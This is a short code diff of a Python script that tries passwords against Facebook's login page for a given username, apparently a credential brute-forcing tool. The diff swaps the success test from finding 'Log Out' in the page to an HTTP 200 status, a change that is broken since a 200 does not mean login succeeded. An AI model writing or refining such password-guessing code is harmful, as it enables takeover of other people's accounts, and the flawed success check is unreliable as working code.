@@ -2,7 +2,6 @@ import requests
 import getpass
 
 def try_password(username, password):
-    # You may need to change the login_url to match the correct Facebook login page
     login_url = 'https://www.facebook.com/login.php'
     payload = {
         'email': username,
@@ -10,7 +9,8 @@ def try_password(username, password):
     }
     session = requests.Session()
     response = session.post(login_url, data=payload)
-    if 'Log Out' in response.text:
+    # Check if the response status code is 200 (OK)
+    if response.status_code == 200:
         print(f'Successful login with password: {password}')
         return True
     else:
